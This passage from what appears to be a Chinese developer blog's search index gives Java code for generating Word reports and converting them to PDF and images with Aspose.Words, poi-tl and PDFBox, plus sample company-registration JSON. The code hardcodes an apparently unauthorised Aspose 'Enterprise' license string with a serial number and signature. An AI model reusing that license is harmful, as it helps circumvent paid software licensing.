<span class="token punctuation">{</span>            File reportFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>savePath<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 判断目标文件所在目录是否存在</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>reportFile<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 如果目标文件所在的目录不存在，则创建父目录</span>                reportFile<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            template<span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span>savePath<span class="token punctuation">)</span><span class="token punctuation">;</span>            PDFHelper<span class="token punctuation">.</span><span class="token function">doc2pdfV2</span><span class="token punctuation">(</span>savePath<span class="token punctuation">,</span> pdfSavePath<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">downloadLocalFile</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> pdfSavePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>用到Word转PDF方法</p><h2 id="PDF转换工具类"><a href="#PDF转换工具类" class="headerlink" title="PDF转换工具类"></a>PDF转换工具类</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>License<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>pdfbox<span class="token punctuation">.</span>pdmodel<span class="token punctuation">.</span>PDDocument<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>pdfbox<span class="token punctuation">.</span>rendering<span class="token punctuation">.</span>PDFRenderer<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>imageio<span class="token punctuation">.</span>ImageIO<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>image<span class="token punctuation">.</span>BufferedImage<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span>DynamicDataSourceContextHolder<span class="token punctuation">.</span>log<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Classname PDFHelper * @Date 2023/5/10 0010 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PDFHelper</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        InputStream is <span class="token operator">=</span> null<span class="token punctuation">;</span>        String licenseStr <span class="token operator">=</span>                <span class="token string">"&lt;License>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Total for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Words for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;/Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;EditionType>Enterprise&lt;/EditionType>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SubscriptionExpiry>20991231&lt;/SubscriptionExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;LicenseExpiry>20991231&lt;/LicenseExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SerialNumber>8bfe198c-7f0c-4ef8-8ff0-acc3237bf0d7&lt;/SerialNumber>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        sNLLKGMUdF0r8O1kKilWAGdgfs2BvJb/2Xp8p5iuDVfZXmhppo+d0Ran1P9TKdjV4ABwAgKXxJ3jcQTqE/2IRfqwnPf8itN8aFZlV3TJPYeD3yWE7IT55Gz6EijUpC7aKeoohTb4w2fpox58wWoF3SNp6sK6jDfiAUGEHYJ9pjU=\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"&lt;/License>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//            is = new FileInputStream("C:\\Users\\Administrator\\Desktop\\tool\\license.xml");</span>        is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>licenseStr<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        License license <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            license<span class="token punctuation">.</span><span class="token function">setLicense</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        FileUtil.copy("C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\202208171149.docx",</span><span class="token comment" spellcheck="true">//                "C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\202208171149V2.docx",false);</span><span class="token comment" spellcheck="true">//        doc2pdf("C:\\Users\\Administrator\\Desktop\\生成完整的信用报告\\企业信用报告.docx");</span>        <span class="token function">doc2pdfV2</span><span class="token punctuation">(</span><span class="token string">"F:\\我的文件\\谷歌.docx"</span><span class="token punctuation">,</span>                <span class="token string">"F:\\我的文件\\谷歌.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * word转pdf     * @Author: CZM     * @Param: [sourceFile, targetFile]     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doc2pdfV2</span><span class="token punctuation">(</span>String sourceFile<span class="token punctuation">,</span> String targetFile<span class="token punctuation">)</span> <span class="token punctuation">{</span>        InputStream is <span class="token operator">=</span> null<span class="token punctuation">;</span>        String licenseStr <span class="token operator">=</span>                <span class="token string">"&lt;License>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Total for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"            &lt;Product>Aspose.Words for Java&lt;/Product>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;/Products>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;EditionType>Enterprise&lt;/EditionType>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SubscriptionExpiry>20991231&lt;/SubscriptionExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;LicenseExpiry>20991231&lt;/LicenseExpiry>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        &lt;SerialNumber>8bfe198c-7f0c-4ef8-8ff0-acc3237bf0d7&lt;/SerialNumber>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Data>\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"        sNLLKGMUdF0r8O1kKilWAGdgfs2BvJb/2Xp8p5iuDVfZXmhppo+d0Ran1P9TKdjV4ABwAgKXxJ3jcQTqE/2IRfqwnPf8itN8aFZlV3TJPYeD3yWE7IT55Gz6EijUpC7aKeoohTb4w2fpox58wWoF3SNp6sK6jDfiAUGEHYJ9pjU=\n"</span> <span class="token operator">+</span>                        <span class="token string">"    &lt;/Signature>\n"</span> <span class="token operator">+</span>                        <span class="token string">"&lt;/License>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//            is = new FileInputStream("C:\\Users\\Administrator\\Desktop\\tool\\license.xml");</span>        is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>licenseStr<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        License license <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            license<span class="token punctuation">.</span><span class="token function">setLicense</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">long</span> old <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            FileOutputStream os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>targetFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>Document doc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>Document</span><span class="token punctuation">(</span>sourceFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            doc<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> com<span class="token punctuation">.</span>aspose<span class="token punctuation">.</span>words<span class="token punctuation">.</span>SaveFormat<span class="token punctuation">.</span>PDF<span class="token punctuation">)</span><span class="token punctuation">;</span>            os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">long</span> now <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"共耗时："</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>now <span class="token operator">-</span> old<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000.0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//转化用时</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"word转pdf 报告生成异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"报告生成失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//pdf转图片</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">pdf2Image</span><span class="token punctuation">(</span>String sourceFile<span class="token punctuation">,</span> String targetFile<span class="token punctuation">)</span> <span class="token punctuation">{</span>        File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>sourceFile<span class="token punctuation">)</span><span class="token punctuation">;</span>        PDDocument pdDocument<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            pdDocument <span class="token operator">=</span> PDDocument<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>            PDFRenderer renderer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDFRenderer</span><span class="token punctuation">(</span>pdDocument<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/* dpi越大转换后越清晰，相对转换速度越慢 */</span>            File dstFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>targetFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            BufferedImage image <span class="token operator">=</span> renderer<span class="token punctuation">.</span><span class="token function">renderImageWithDPI</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ImageIO<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">,</span> dstFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"PDF文档转PNG图片成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//html转换PDF等更多PDF操作可看itextpdf</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Word </category>
          
          <category> PDF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Word操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Word报告生成、报告转PDF、报告目录与内容自定义的实现</title>
      <link href="/2022/06/02/word-bao-gao-sheng-cheng-pdf-bao-gao-sheng-cheng/"/>
      <url>/2022/06/02/word-bao-gao-sheng-cheng-pdf-bao-gao-sheng-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Word报告生成、报告转PDF、报告目录与内容自定义的实现"><a href="#Word报告生成、报告转PDF、报告目录与内容自定义的实现" class="headerlink" title="Word报告生成、报告转PDF、报告目录与内容自定义的实现"></a>Word报告生成、报告转PDF、报告目录与内容自定义的实现</h1><h2 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h2><p>注意poi-ooxml依赖的版本</p><pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.poi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>poi-ooxml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        导出Word--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.deepoove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>poi-tl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.12.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        Word转PDF--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.aspose<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>aspose-words<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>21.11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPath</span><span class="token punctuation">></span></span>${project.basedir}/src/main/resources/lib/aspose-words-21.11-jdk17.jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPath</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        pdf转图片--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.pdfbox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>pdfbox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.27<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h2 id="报告模板文件地址"><a href="#报告模板文件地址" class="headerlink" title="报告模板文件地址"></a>报告模板文件地址</h2><blockquote><p><a href="/images/Word/%E9%A3%8E%E9%99%A9%E6%8A%A5%E5%91%8A%E8%87%AA%E5%AE%9A%E4%B9%89%E6%95%B0%E6%8D%AE%E6%A8%A1%E6%9D%BF.docx">Word模板</a></p></blockquote><p>模板的目录和内容可以根据如下配置是否显示</p><p><img src="/images/Word%E6%A8%A1%E6%9D%BF.png"></p><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><h3 id="生成报告代码"><a href="#生成报告代码" class="headerlink" title="生成报告代码"></a>生成报告代码</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileUtil<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span>type<span class="token punctuation">.</span>TypeReference<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>project<span class="token punctuation">.</span>tool<span class="token punctuation">.</span>PDFHelper<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>Slf4j<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Service<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token annotation punctuation">@Service</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CreditReportFileServiceImpl</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String json <span class="token operator">=</span> <span class="token string">"{\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"zsxx\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"rjzzq\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"copyright\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"data\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"count\":0\n"</span> <span class="token operator">+</span>                <span class="token string">"    },\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"    \"entBasic\":{\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entHisName\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entName\":\"泉州海威包袋有限公司\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"source\":\"0\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entdeadline\":\"2016-05-30 至 2046-05-29\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"citycode\":\"惠安县\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entRegUnit\":\"泉州市工商行政管理局泉州台商投资区分局\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"lastUpdBy\":\"-\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entSocialNo\":\"91350521MA348N1GXG\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"stockcode\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entRegNo\":\"91350521MA348N1GXG\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"dataStatus\":\"01\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"regcapcur\":\"人民币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entAddress\":\"福建省泉州台商投资区洛阳镇洛河路（三角牌）202号\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"createdDt\":1531434966000,\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entChangeTargetUid\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entFullName\":\"Quanzhou Hiway Bags Co., Ltd\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"dataSource\":\"10\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"industryphy\":\"519\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"attrib04\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"attrib03\":\"2016-05-30\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entRegAmount\":\"100 万人民币\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entNature\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entcity\":\"350521104\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entType\":\"有限责任公司（自然人投资或控股）\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"legalPersonID\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"lastUpdDt\":1702619390000,\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"industryconame\":\"皮箱、包（袋）制造\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entRegType\":\"有限责任公司（自然人投资或控股）\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"legalPerson\":\"曾汉青\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"taxNo\":\"91350521MA348N1GXG\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"companyImage\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entRealAmount\":\"-\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"dataOrg\":\"MA348N1GX\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"industryMain\":\"5199\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entScale\":\"\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entemail\":\"暂无\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"rowId\":1238506,\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entRegDt\":\"2016-05-30\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"tagList\":[\n"</span> <span class="token operator">+</span>                <span class="token string">"\n"</span> <span class="token operator">+</span>                <span class="token string">"        ],\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entphone\":\"1380590****\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"createdBy\":\"sys\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entCode\":\"350509100083633\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entRange\":\"通过互联网及实体店销售：包袋、箱包、包装制品、饰品、布艺制品、工艺品、皮具、日用百货、服装、鞋帽；自营和代理各类商品和技术的进出口，但涉及前置许可或国家限定公司经营或禁止进出口的商品和技术除外；商务信息咨询服务（不含金融、证券、期货的投资咨询）。（依法须经批准的项目，经相关部门批准后方可开展经营活动）\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entUid\":\"E797BB48381E11E68FE94A158A77B72E\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entIsChangename\":\"0\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entstatus\":\"存续\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"shortStatus\":\"存续\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"entCertificate\":\"统一社会信用代码\",\n"</span> <span class="token operator">+</span>                <span class="token string">"        \"businessAddress\":\"福建省泉州台商投资区洛阳镇洛河路（三角牌）202号\",\n"</span> <span class="token 